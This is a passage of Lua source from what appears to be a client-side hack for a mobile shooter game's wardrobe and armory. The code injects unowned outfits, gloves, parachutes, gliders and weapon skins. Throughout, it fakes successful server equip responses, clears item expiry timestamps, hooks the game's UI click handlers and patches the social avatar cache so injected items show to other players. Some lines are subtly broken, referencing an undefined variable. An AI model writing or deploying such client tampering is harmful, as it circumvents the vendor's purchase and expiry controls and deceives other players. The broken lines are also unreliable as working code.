    local oldIns, oldRes = F.findWornInsBySubType(st)
    F.removeRoleWearBySubType(st)
    F.saveEquip(resID, insID)

    local slot = (st == MASK_SUB) and 2 or 6
    pcall(function()
        local wfu = require("client.slua.logic.wardrobe.fashionbag.wardrobe_fashion_utils")
        local idx = wfu.GetRoleWearIndexBySubType and wfu:GetRoleWearIndexBySubType(st)
        if idx then slot = idx end
    end)

    local olditem
    if oldIns and oldIns ~= insID then
        olditem = { res_id = oldRes or R.insToRes[oldIns], count = 1, instid = oldIns }
    end

    local WRH = require("client.network.Protocol.WardRobeHandler")
    local item = { res_id = resID, count = 1, instid = insID, color = d.color, pattern = d.pattern }
    WRH.on_depot_put_on_rsp(NET_OK, item, olditem, slot, insID, oldIns or 0)

    pcall(function() F.syncFashionBagRolewear() end)
    F.invalidateSocialWearCache()
end

function F.canRoleWear(resID, st)
    st = st or F.subType(F.cfg(resID))
    if FACE_SUBS[st] or BODY_SUBS[st] then return true end
    if st == GLOVES_SUB then return true end
    if st == OUTFIT_SUB and F.wardrobeTab(resID) == TAB_CLOTHES then return true end
    return false
end

F.putOnRoleWear = function(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d0 = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d0 and tonumber(d.resID or d.res_id)
    end
    if not resID or resID <= 0 then return end
    if not R.insToRes[insID] then R.insToRes[insID] = resID; R.resToIns[resID] = insID end
    F.ensureDepotItemValid(insID, resID)
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return
    end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    if not d then return end
    local st = F.subType(F.cfg(resID)) or tonumber(d.itemSubType)
    if not F.canRoleWear(resID, st) then return end

    local filterFn
    if st == OUTFIT_SUB then
        filterFn = function(r) return F.wardrobeTab(r) == TAB_CLOTHES end
    end
    local oldIns, oldRes = F.findWornInsBySubType(st, filterFn)
    F.removeRoleWearBySubType(st, filterFn)
    F.saveEquip(resID, insID)

    local slot = PKG_SLOT
    pcall(function()
        local wfu = require("client.slua.logic.wardrobe.fashionbag.wardrobe_fashion_utils")
        local idx = wfu.GetRoleWearIndexBySubType and wfu:GetRoleWearIndexBySubType(st)
        if idx then slot = idx end
    end)

    local olditem
    if oldIns and oldIns ~= insID then
        olditem = { res_id = oldRes or R.insToRes[oldIns], count = 1, instid = oldIns }
    end

    local WRH = require("client.network.Protocol.WardRobeHandler")
    local item = { res_id = resID, count = 1, instid = insID, color = d.color, pattern = d.pattern }
    WRH.on_depot_put_on_rsp(NET_OK, item, olditem, slot, insID, oldIns or 0)

    if BAG_SUBS[st] or HELMET_SUBS[st] then
        pcall(function()
            DataMgr.equipmentSkinInsIDTable = DataMgr.equipmentSkinInsIDTable or {}
            DataMgr.equipmentSkinInsIDTable[st] = insID
            local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
            local bag = fbd.GetCurrentFashionBag and fbd:GetCurrentFashionBag()
            if bag then
                if st == 504 or st == 501 then
                    DataMgr.equipmentSkinInsIDTable[504] = insID
                    bag.bag_skin = insID
                elseif st == 505 or st == 502 then
                    DataMgr.equipmentSkinInsIDTable[505] = insID
                    bag.helmet_skin = insID
                end
            end
        end)
    end

    pcall(function() F.syncFashionBagRolewear() end)
    F.invalidateSocialWearCache()
end

function F.putOnGloves(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d0 = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d0 and tonumber(d.resID or d.res_id)
    end
    if not resID or resID <= 0 then return end
    if not R.insToRes[insID] then R.insToRes[insID] = resID; R.resToIns[resID] = insID end
    F.ensureDepotItemValid(insID, resID)
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return
    end
    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
    local d = wd:GetHallDepotItemDataByInsID(insID)
    if not d then return end

    local oldIns, oldRes = F.findWornInsBySubType(GLOVES_SUB)
    F.removeRoleWearBySubType(GLOVES_SUB)
    F.saveEquip(resID, insID)

    local slot = 8
    pcall(function()
        local wfu = require("client.slua.logic.wardrobe.fashionbag.wardrobe_fashion_utils")
        local idx = wfu.GetRoleWearIndexBySubType and wfu:GetRoleWearIndexBySubType(GLOVES_SUB)
        if idx then slot = idx end
    end)

    local olditem
    if oldIns and oldIns ~= insID then
        olditem = { res_id = oldRes or R.insToRes[oldIns], count = 1, instid = oldIns }
    end

    local WRH = require("client.network.Protocol.WardRobeHandler")
    local item = { res_id = resID, count = 1, instid = insID, color = d.color, pattern = d.pattern, expire_ts = 0 }
    WRH.on_depot_put_on_rsp(NET_OK, item, olditem, slot, insID, oldIns or 0)

    pcall(function()
        local logic_wardrobe_avatar = require("client.slua.logic.wardrobe.logic_wardrobe_avatar")
        logic_wardrobe_avatar:AddToWearInfo(GLOVES_SUB, insID, resID, d.color or 0, d.pattern or 0)
        DataMgr.UpdateRoleWearData(insID, oldIns or 0)
        logic_wardrobe_avatar:AvatarChange(resID, true, d.color, d.pattern)
    end)
    pcall(function()
        local wl = require("client.slua.logic.wardrobe.logic_wardrobe_new")
        if wl.SetClickItemInsId then wl:SetClickItemInsId(insID) end
    end)
    pcall(function()
        if EventSystem and EVENTTYPE_WARDROBE then
            if EVENTID_WARDROBE_UPDATE_ITEM_LIST then
                EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_ITEM_LIST)
            end
            if EVENTID_WARDROBE_UPDATE_AVATAR_LIST then
                EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_AVATAR_LIST)
            end
        end
    end)
    F.invalidateSocialWearCache()
end

function F.ensureDepotItemValid(insID, resID)
    insID = tonumber(insID)
    if not insID then return end
    pcall(function()
        local entity = F.getEntity()
        if entity and entity.GetDataByInsID then
            local d = entity:GetDataByInsID(insID)
            if d then
                d.expire_ts = 0
                if d.expireTS ~= nil then d.expireTS = 0 end
                if d.valid_hours ~= nil then d.valid_hours = 0 end
            end
        end
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local hd = wd:GetHallDepotItemDataByInsID(insID)
        if hd then
            hd.expire_ts = 0
            if hd.expireTS ~= nil then hd.expireTS = 0 end
            if hd.valid_hours ~= nil then hd.valid_hours = 0 end
        end
    end)
end

function F.clearItemExpire(itemData, insID, resID)
    F.ensureDepotItemValid(insID, resID)
    if type(itemData) == "table" then
        itemData.expireTS = 0
        itemData.expire_ts = 0
        itemData.expireTs = 0
    end
end

function F.onGlideClick(self, itemData)
    if not itemData then return end
    local insID = tonumber(itemData.ins_id)
    local resID = tonumber(itemData.res_id)
    F.clearItemExpire(itemData, insID, resID)
    local isGlide = resID and F.isGlideRes(resID)
    if not isGlide and itemData.itemSubType then
        isGlide = GLIDER_SUBS[tonumber(itemData.itemSubType)] == true
    end
    if insID and resID and isGlide then
        F.saveEquip(resID, insID)
        if F.putOnGlider(insID) then
            pcall(function()
                if self.ShowGlide then self:ShowGlide(resID) end
                if self.ChangeItemStatus then self:ChangeItemStatus(insID, true) end
            end)
            return
        end
    end
    if _G.AddOutfitGlideClickOrig then
        F.clearItemExpire(itemData, insID, resID)
        return _G.AddOutfitGlideClickOrig(self, itemData)
    end
end

function F.onParachuteClick(self, itemData)
    if not itemData then return end
    local insID = tonumber(itemData.ins_id)
    local resID = tonumber(itemData.res_id)
    F.clearItemExpire(itemData, insID, resID)
    if insID and resID and F.isParachuteRes(resID) then
        F.saveEquip(resID, insID)
        if F.putOnParachute(insID) then
            pcall(function()
                if self.ChangeItemStatus then self:ChangeItemStatus(insID, true) end
            end)
            return
        end
    end
    if _G.AddOutfitParaClickOrig then
        return _G.AddOutfitParaClickOrig(self, itemData)
    end
end

function F.hookAirborneClick()
    pcall(function()
        local WG = require("client.slua.umg.Wardrobe.subtab_gliding")
        if WG then
            if not WG._AddOutfitGlideWrapped then
                WG._AddOutfitGlideWrapped = true
                _G.AddOutfitGlideClickOrig = WG.ClickItem
            end
            WG.ClickItem = function(self, itemData)
                return F.onGlideClick(self, itemData)
            end
        end
        local WP = require("client.slua.umg.Wardrobe.subtab_parachute")
        if WP then
            if not WP._AddOutfitParaWrapped then
                WP._AddOutfitParaWrapped = true
                _G.AddOutfitParaClickOrig = WP.ClickItem
            end
            WP.ClickItem = function(self, itemData)
                return F.onParachuteClick(self, itemData)
            end
        end
    end)
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        if fbd and not fbd._AddOutfitAirborneFBHooked then
            fbd._AddOutfitAirborneFBHooked = true
            local oG = fbd.UpdateAircraftOrGliding
            fbd.UpdateAircraftOrGliding = function(self, putOnID, bAircraft)
                local r = oG(self, putOnID, bAircraft)
                local ins = tonumber(putOnID)
                if ins and ins > 0 then
                    local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                    local d = wd:GetValidHallDepotItemDataByInsID(ins) or wd:GetHallDepotItemDataByInsID(ins)
                    local res = d and tonumber(d.resID)
                    if res and F.isGlideRes(res) then F.saveEquip(res, ins) end
                end
                return r
            end
            local oP = fbd.UpdateParachute
            if oP then
                fbd.UpdateParachute = function(self, insID)
                    local r = oP(self, insID)
                    local ins = tonumber(insID)
                    if ins and ins > 0 then
                        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
                        local d = wd:GetValidHallDepotItemDataByInsID(ins) or wd:GetHallDepotItemDataByInsID(ins)
                        local res = d and tonumber(d.resID)
                        if res and F.isParachuteRes(res) then F.saveEquip(res, ins) end
                    end
                    return r
                end
            end
        end
    end)
    pcall(function()
        if not ModuleManager or not ModuleManager.GetModule then return end
        local FB = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.FashionBagEditUtils)
        if FB and not FB._AddOutfitFBBagHooked then
            FB._AddOutfitFBBagHooked = true
            local o = FB.PutOnFashionBagItem
            FB.PutOnFashionBagItem = function(self, itemData)
                if itemData then
                    F.clearItemExpire(itemData, itemData.ins_id, itemData.res_id)
                end
                local r = o(self, itemData)
                if itemData then
                    local res = tonumber(itemData.res_id)
                    local ins = tonumber(itemData.ins_id)
                    if res and ins and (F.isGlideRes(res) or F.isParachuteRes(res)) then
                        F.saveEquip(res, ins)
                    end
                end
                return r
            end
        end
    end)
end

function F.putOnParachute(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d and tonumber(d.resID)
    end
    if not resID or not F.isParachuteRes(resID) then return false end
    if not R.insToRes[insID] then R.insToRes[insID] = resID end
    F.ensureDepotItemValid(insID, resID)
    F.saveEquip(resID, insID)
    F.ensureInjectedItemAlive(nil, resID, insID)
    local ready = F.isResourcesReady(resID)
    if not ready then F.requestResourceDownload(resID) end
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        if fbd.SetParachute then fbd:SetParachute(insID) end
        if fbd.UpdateParachute then fbd:UpdateParachute(insID) end
    end)
    if ready then
        local item = {
            res_id = resID, resID = resID,
            instid = insID, ins_id = insID, insID = insID,
            expire_ts = 0, expireTS = 0, count = 1,
        }
        local WRH = require("client.network.Protocol.WardRobeHandler")
        WRH.on_depot_put_on_rsp(NET_OK, item, nil, 1, insID, 0)
    end
    return true
end

function F.putOnGlider(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local d = wd:GetValidHallDepotItemDataByInsID(insID) or wd:GetHallDepotItemDataByInsID(insID)
        resID = d and tonumber(d.resID)
    end
    if not resID or resID <= 0 then return false end
    local st = F.depotSubType(insID, resID)
    if not F.isGlideRes(resID) and not GLIDER_SUBS[st] then return false end
    if not R.insToRes[insID] then R.insToRes[insID] = resID end
    F.ensureDepotItemValid(insID, resID)
    F.saveEquip(resID, insID)
    F.ensureInjectedItemAlive(nil, resID, insID)
    local ready = F.isResourcesReady(resID)
    if not ready then F.requestResourceDownload(resID) end
    local bAircraft = false
    pcall(function()
        local ModelDisplayTypeHelper = require("client.logic.avatar.ModelDisplayTypeHelper")
        local st = F.subType(F.cfg(resID))
        bAircraft = ModelDisplayTypeHelper.IsGlideSmoke(st)
    end)
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        if fbd.UpdateAircraftOrGliding then
            fbd:UpdateAircraftOrGliding(insID, bAircraft)
        elseif fbd.SetGliding then
            fbd:SetGliding(insID)
            if DataMgr.UpdateEffect then DataMgr.UpdateEffect(insID) end
        end
    end)
    if ready then
        local item = {
            res_id = resID, resID = resID,
            instid = insID, ins_id = insID, insID = insID,
            expire_ts = 0, expireTS = 0, count = 1,
        }
        local WRH = require("client.network.Protocol.WardRobeHandler")
        WRH.on_depot_put_on_rsp(NET_OK, item, nil, 1, insID, 0)
    end
    return true
end

function F.syncAirborneToDataMgr()
    F.applyPersistSlotsToCache()
    local cch = F.cache()
    local paraRes = F.getDesiredParachuteRes()
    local gliderRes = F.getDesiredGliderRes()
    if paraRes and paraRes > 0 and not cch.parachuteIns then
        cch.parachuteIns = F.resolveInsForRes(paraRes)
        cch.parachuteRes = paraRes
    end
    if gliderRes and gliderRes > 0 and not cch.gliderIns then
        cch.gliderIns = F.resolveInsForRes(gliderRes)
        cch.gliderRes = gliderRes
    end
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        if cch.parachuteIns and tonumber(cch.parachuteIns) > 0 then
            if fbd.SetParachute then fbd:SetParachute(cch.parachuteIns) end
            if DataMgr.roleData then DataMgr.roleData.parachute = tostring(cch.parachuteIns) end
        end
        if cch.gliderIns and tonumber(cch.gliderIns) > 0 then
            local bAircraft = false
            if cch.gliderRes then
                pcall(function()
                    local MDH = require("client.logic.avatar.ModelDisplayTypeHelper")
                    bAircraft = not MDH.IsGlideSmoke(F.subType(F.cfg(cch.gliderRes)))
                end)
            end
            if fbd.UpdateAircraftOrGliding then
                fbd:UpdateAircraftOrGliding(cch.gliderIns, bAircraft)
            elseif fbd.SetGliding then
                fbd:SetGliding(cch.gliderIns)
                if DataMgr.UpdateEffect then DataMgr.UpdateEffect(cch.gliderIns) end
            end
            if DataMgr.roleData then
                if bAircraft then
                    DataMgr.roleData.aircraft_put_id = tostring(cch.gliderIns)
                    DataMgr.gliding = cch.gliderIns
                else
                    DataMgr.roleData.gliding = tostring(cch.gliderIns)
                end
            end
        end
    end)
end

function F.putOnGenericInjected(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then return end
    if not F.isResourcesReady(resID) then
        F.requestResourceDownload(resID)
        return
    end
    F.saveEquip(resID, insID)
    local WRH = require("client.network.Protocol.WardRobeHandler")
    WRH.on_depot_put_on_rsp(NET_OK, { res_id = resID, count = 1, instid = insID }, nil, 1, insID, 0)
end

function F.clearEquipCache(resID)
    local st = F.subType(F.cfg(resID))
    local cch = F.cache()
    if st == OUTFIT_SUB then
        if F.wardrobeTab(resID) == TAB_CLOTHES then
            cch.tshirtRes, cch.tshirtIns = nil, nil
            _G.AddOutfitLastLobbyTshirtRes = nil
            F.persistForgetSlot("tshirt")
        else
            cch.outfitRes, cch.outfitIns = nil, nil
            _G.AddOutfitLastLobbyOutfitRes = nil
            F.persistForgetSlot("outfit")
        end
    elseif st == HAT_SUB or HEAD_SUBS[st] then
        cch.hatRes, cch.hatIns = nil, nil
        _G.AddOutfitLastLobbyHatRes = nil
        F.persistForgetSlot("hat")
    elseif st == MASK_SUB then
        cch.maskRes, cch.maskIns = nil, nil
        _G.AddOutfitLastLobbyMaskRes = nil
        F.persistForgetSlot("mask")
    elseif st == GLASS_SUB then
        cch.glassRes, cch.glassIns = nil, nil
        _G.AddOutfitLastLobbyGlassRes = nil
        F.persistForgetSlot("glass")
    elseif st == PANTS_SUB then
        cch.pantsRes, cch.pantsIns = nil, nil
        _G.AddOutfitLastLobbyPantsRes = nil
        F.persistForgetSlot("pants")
    elseif st == SHOES_SUB then
        cch.shoesRes, cch.shoesIns = nil, nil
        _G.AddOutfitLastLobbyShoesRes = nil
        F.persistForgetSlot("shoes")
    elseif BAG_SUBS[st] then
        cch.bagRes, cch.bagIns = nil, nil
        _G.AddOutfitLastLobbyBagRes = nil
        F.persistForgetSlot("bag")
    elseif HELMET_SUBS[st] then
        cch.helmetRes, cch.helmetIns = nil, nil
        _G.AddOutfitLastLobbyHelmetRes = nil
        F.persistForgetSlot("helmet")
    elseif st == PARACHUTE_SUB then
        cch.parachuteRes, cch.parachuteIns = nil, nil
        _G.AddOutfitLastLobbyParachuteRes = nil
        F.persistForgetSlot("parachute")
    elseif F.isGlideRes(resID) then
        cch.gliderRes, cch.gliderIns = nil, nil
        _G.AddOutfitLastLobbyGliderRes = nil
        F.persistForgetSlot("glider")
    elseif st == GLOVES_SUB then
        cch.glovesRes, cch.glovesIns = nil, nil
        _G.AddOutfitLastLobbyGlovesRes = nil
        F.persistForgetSlot("gloves")
    end
    _matchApplied = false
    F.invalidateSocialWearCache()
    F.perfInvalidateLobby()
    F.persistMarkDirty()
end

function F.takeOffInjected(insID)
    insID = tonumber(insID)
    local resID = R.insToRes[insID]
    if not resID then return end
    local st = F.subType(F.cfg(resID))

    pcall(function()
        local WRH = require("client.network.Protocol.WardRobeHandler")
        WRH.on_depot_put_down_rsp(NET_OK, { res_id = resID, count = 1 }, insID)
    end)

    pcall(function()
        local AvatarData = require("client.logic.data.AvatarData")
        AvatarData.RemoveRoleWearDataByValue(insID)
    end)
    if st == HAT_SUB or HEAD_SUBS[st] then
        pcall(function()
            local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
            local bag = fbd.GetCurrentFashionBag and fbd:GetCurrentFashionBag()
            if bag and tonumber(bag.head_show) == insID then fbd:SetHeadShow(0) end
        end)
    end
    if BAG_SUBS[st] or HELMET_SUBS[st] then
        pcall(function()
            local t = DataMgr.equipmentSkinInsIDTable
            if t then
                for _, k in ipairs({ st, 504, 505 }) do
                    if tonumber(t[k]) == insID then t[k] = 0 end
                end
            end
            local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
            local bag = fbd.GetCurrentFashionBag and fbd:GetCurrentFashionBag()
            if bag then
                if tonumber(bag.bag_skin) == insID then bag.bag_skin = 0 end
                if tonumber(bag.helmet_skin) == insID then bag.helmet_skin = 0 end
            end
        end)
    end

    F.clearEquipCache(resID)
    pcall(function() F.syncFashionBagRolewear() end)
end

function F.syncWeaponArmorySilent(weaponID, insID)
    weaponID, insID = tonumber(weaponID), tonumber(insID)
    if not weaponID or not insID or not F.isInjectedIns(insID) then return end
    local resID = R.insToRes[insID]
    if not resID then return end
    local Arm = require("client.logic.armory.logic_armory")
    Arm.rsp_list = Arm.rsp_list or { skin_list = {}, install_list = {} }
    Arm.rsp_list.install_list = Arm.rsp_list.install_list or {}
    F.injectArmory(resID, insID)
    Arm.rsp_list.install_list[weaponID] = { skin_id = insID }
    pcall(function()
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        if fbd.UpdateCurrentFashionBagWeaponSkin then
            fbd:UpdateCurrentFashionBagWeaponSkin(weaponID, insID)
        end
    end)
end

function F.equipWeaponSkin(weaponID, insID, forceVisual)
    weaponID, insID = tonumber(weaponID), tonumber(insID)
    if not weaponID or not insID or not F.isInjectedIns(insID) then return false end
    local resID = R.insToRes[insID]
    if not resID then return false end

    _G.AddOutfitWeaponEquipped = _G.AddOutfitWeaponEquipped or {}
    if not forceVisual and F.isWeaponVisuallyEquipped(weaponID, insID) then
        F.syncWeaponArmorySilent(weaponID, insID)
        return false
    end
    F.saveEquip(resID, insID)

    local Arm = require("client.logic.armory.logic_armory")
    local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
    local HT = require("client.logic.lobby.hall_theme_utils")
    local wgl = require("client.slua.logic.wardrobe.logic_wardrobe_gun")

    F.injectArmory(resID, insID)
    Arm.rsp_list.install_list[weaponID] = { skin_id = insID }
    if fbd.UpdateCurrentFashionBagWeaponSkin then
        fbd:UpdateCurrentFashionBagWeaponSkin(weaponID, insID)
    end

    local bagIdx = fbd:GetFashionBagUseIndex()
    HT.proc_skin_list_chg("weapon_skin", weaponID, insID, bagIdx, {})

    wgl:SetGunID(weaponID)
    wgl:UpdateCurrentGunAvatar(weaponID, insID)

    if EventSystem and EVENTTYPE_ARMORY and EVENTID_ARMORY_EQUIP_STAT_CHANGE then
        EventSystem:postEvent(EVENTTYPE_ARMORY, EVENTID_ARMORY_EQUIP_STAT_CHANGE, resID)
    end
    if EventSystem and EVENTTYPE_WARDROBE and EVENTID_WARDROBE_UPDATE_CURRENT_PUT_ON_GUN then
        EventSystem:postEvent(EVENTTYPE_WARDROBE, EVENTID_WARDROBE_UPDATE_CURRENT_PUT_ON_GUN, resID)
    end
    _G.AddOutfitWeaponEquipped[weaponID] = insID
    return true
end

local SOCIAL = _G.AddOutfitSocialState or {}
_G.AddOutfitSocialState = SOCIAL
SOCIAL.debGen = SOCIAL.debGen or 0
SOCIAL.wearPatchKey = SOCIAL.wearPatchKey or nil
SOCIAL.snapshotKey = SOCIAL.snapshotKey or nil
SOCIAL.fullSnapshot = SOCIAL.fullSnapshot or nil

function F.socialDebounce(sec, fn)
    SOCIAL.debGen = (SOCIAL.debGen or 0) + 1
    local gen = SOCIAL.debGen
    F.later(sec, function()
        if gen ~= SOCIAL.debGen then return end
        pcall(fn)
    end)
end

function F.getLobbyCurPage()
    local p = nil
    pcall(function()
        local LMC = require("client.slua.logic.lobby.Main.Lobby_Main_Control")
        if LMC.GetCurPage then p = LMC.GetCurPage() end
    end)
    return p
end

function F.isLobbyLeftPage()
    return ENUM_LobbyPageType and F.getLobbyCurPage() == ENUM_LobbyPageType.Left
end

function F.getWeaponSkinResFast()
    local cch = F.cache()
    local wid = tonumber(DataMgr.Weapon_ID) or 0
    local w = wid > 0 and cch.weapons[wid] or nil
    if w and w.resID and w.resID > 0 then return w.resID end
    for _, ww in pairs(cch.weapons) do
        if ww.resID and ww.resID > 0 then return ww.resID end
    end
    return nil
end

function F.resolveLobbyWeaponSkinRes()
    if LOBBY.skinResolved then return LOBBY.cachedSkin end
    local wid = tonumber(DataMgr.Weapon_ID) or 0
    local skin = F.getWeaponSkinResFast()
    if skin and skin > 0 then return skin end

    if wid > 0 then
        local fromMatch = F.getMatchWeaponSkin(wid)
        if fromMatch and fromMatch > 0 then return fromMatch end
    end
    if MATCH_CONFIG.weaponSkins then
        for _, s in pairs(MATCH_CONFIG.weaponSkins) do
            s = tonumber(s)
            if s and s > 0 then return s end
        end
    end

    pcall(function()
        local Arm = require("client.logic.armory.logic_armory")
        local entry = Arm.rsp_list and Arm.rsp_list.install_list
            and Arm.rsp_list.install_list[wid > 0 and wid or 101004]
        local insID = tonumber(entry and entry.skin_id) or 0
        if insID > 0 and F.isInjectedIns(insID) then
            skin = tonumber(R.insToRes[insID])
        elseif insID > 0 then
            local wd = require("client.slua.logic.wardrobe.wardrobe_data")
            local d = wd:GetHallDepotItemDataByInsID(insID)
            if d and d.resID then skin = tonumber(d.resID) end
        end
    end)
    if skin and skin > 0 then return skin end

    pcall(function()
        local wgl = require("client.slua.logic.wardrobe.logic_wardrobe_gun")
        if wgl.GetSkinIdByWeaponID and wid > 0 then
            local insID = tonumber(wgl:GetSkinIdByWeaponID(wid)) or 0
            if insID > 0 and F.isInjectedIns(insID) then
                skin = tonumber(R.insToRes[insID])
            end
        end
    end)
    LOBBY.skinResolved = true
    LOBBY.cachedSkin = (skin and skin > 0) and skin or nil
    return LOBBY.cachedSkin
end

function F.resolveLobbyOutfitRes()
    if LOBBY.outfitResolved then return LOBBY.cachedOutfit end
    local cch = F.cache()
    local outfitRes = tonumber(cch.outfitRes) or 0
    if outfitRes > 0 then
        LOBBY.outfitResolved = true
        LOBBY.cachedOutfit = outfitRes
        return outfitRes
    end
    outfitRes = tonumber(_G.AddOutfitLastLobbyOutfitRes) or 0
    if outfitRes > 0 then
        LOBBY.outfitResolved = true
        LOBBY.cachedOutfit = outfitRes
        return outfitRes
    end
    if MATCH_CONFIG.outfitRes and tonumber(MATCH_CONFIG.outfitRes) > 0 then
        LOBBY.outfitResolved = true
        LOBBY.cachedOutfit = tonumber(MATCH_CONFIG.outfitRes)
        return LOBBY.cachedOutfit
    end

    local injectedRes, anyRes
    pcall(function()
        local AvatarData = require("client.logic.data.AvatarData")
        local wd = require("client.slua.logic.wardrobe.wardrobe_data")
        local function resFromIns(ins)
            ins = tonumber(ins)
            if not ins or ins <= 0 then return nil end
            if F.isInjectedIns(ins) then return tonumber(R.insToRes[ins]) end
            local d = wd:GetHallDepotItemDataByInsID(ins)
            return d and tonumber(d.resID) or nil
        end
        for _, ins in pairs(AvatarData.GetRoleWear()) do
            local res = resFromIns(ins)
            if res and F.isSuitRes(res) then
                if F.isInjectedRes(res) then injectedRes = res end
                anyRes = anyRes or res
            end
        end
        local fbd = require("client.slua.logic.wardrobe.fashionbag.fashionbag_data")
        local bag = fbd.GetCurrentFashionBag and fbd:GetCurrentFashionBag()
        if bag and bag.rolewear_list then
            for _, ins in pairs(bag.rolewear_list) do
                local res = resFromIns(ins)
                if res and F.isSuitRes(res) then
                    if F.isInjectedRes(res) then injectedRes = res end
                    anyRes = anyRes or res
                end
            end
        end
    end)
    if injectedRes and injectedRes > 0 then
        LOBBY.outfitResolved = true
        LOBBY.cachedOutfit = injectedRes
        return injectedRes
    end
    if anyRes and anyRes > 0 then
        LOBBY.outfitResolved = true
        LOBBY.cachedOutfit = anyRes
        return anyRes
    end
    LOBBY.outfitResolved = true
    LOBBY.cachedOutfit = nil
    return nil
end

function F.rememberLobbyOutfitRes(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 or not F.isSuitRes(resID) then return end
    _G.AddOutfitLastLobbyOutfitRes = resID
    F.invalidateLobbyResolved()
    local cch = F.cache()
    if not cch.outfitRes or cch.outfitRes <= 0 then
        cch.outfitRes = resID
        if F.isInjectedRes(resID) then cch.outfitIns = R.resToIns[resID] end
    end
end

function F.wearPatchKey()
    local outfit = F.resolveLobbyOutfitRes() or 0
    local skin = F.resolveLobbyWeaponSkinRes() or 0
    local openGun = 1
    pcall(function()
        local lds = require("client.slua.logic.wardrobe.logic_display_setting")
        if lds.data and lds.data.OpenGun ~= nil then openGun = lds.data.OpenGun and 1 or 0 end
    end)
    return outfit .. "_" .. skin .. "_" .. openGun
end

function F.syncDepotShowWeaponFlags(depot)
    depot = depot or {}
    pcall(function()
        local lds = require("client.slua.logic.wardrobe.logic_display_setting")
        if lds.data then
            if lds.data.OpenGun ~= nil then depot.weapon = lds.data.OpenGun end
            if lds.data.OpenSocialWeapon ~= nil then depot.social_weapon = lds.data.OpenSocialWeapon end
        end
    end)
    return depot
end

function F.applyInjectedPspace(roleData)
    if not roleData then return end
    roleData.bshow = true
    roleData.pspace_wear_ext = roleData.pspace_wear_ext or {}
    local outfitRes = F.resolveLobbyOutfitRes()
    if outfitRes and outfitRes > 0 then
        roleData.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_CLOTH] = { outfitRes, 0, 0 }
    end
    local skinRes = F.resolveLobbyWeaponSkinRes()
    if skinRes and skinRes > 0 then
        roleData.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPON] = { 0, 0, 0 }
        roleData.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPONSKIN] = { skinRes, 0, 0 }
        roleData.depot_show_info = roleData.depot_show_info or {}
        if roleData.depot_show_info.weapon == nil then
            roleData.depot_show_info.weapon = true
        end
    end
    roleData.depot_show_info = F.syncDepotShowWeaponFlags(roleData.depot_show_info)
end

function F.patchSelfWearCache(force)
    local key = F.wearPatchKey()
    if not force and SOCIAL.wearPatchKey == key then return false end
    SOCIAL.wearPatchKey = key
    SOCIAL.snapshotKey = nil
    SOCIAL.fullSnapshot = nil

    local myUid = tonumber(DataMgr.roleData.uid)
    if not myUid then return false end

    local changed = false
    pcall(function()
        local BD = ModuleManager.GetModule(ModuleManager.DataModuleConfig.BasicDataAvatarWearInfo)
        local d = BD:GetCacheData(myUid)
        if not d then
            BD:OnHandleMsgDataAndCallback(myUid, F.buildLocalRoleDataForCoupleAvatar())
            return true
        end
        local oldCloth = d.pspace_wear_ext and d.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_CLOTH]
        local oldSkin = d.pspace_wear_ext and d.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPONSKIN]
        F.applyInjectedPspace(d)
        local nc = d.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_CLOTH]
        local ns = d.pspace_wear_ext[ENUM_AVATAR_SHOW_TYPE.SHOW_POS_WEAPONSKIN]
        if oldCloth ~= nc or oldSkin ~= ns or not d.bshow then changed = true end
    end)
    return force or changed
end

function F.requestSocialAvatarRefresh()
    pcall(function()
        if EventSystem and EVENTTYPE_LOBBY_SOCIAL and EVENTID_SOCIAL_LOBBY_REFRESH_AVATAR then
            EventSystem:postEvent(EVENTTYPE_LOBBY_SOCIAL, EVENTID_SOCIAL_LOBBY_REFRESH_AVATAR)
        end
    end)
end

function F.onSocialWearDirty(forceRefresh)
    SOCIAL.lastHandSkin = nil
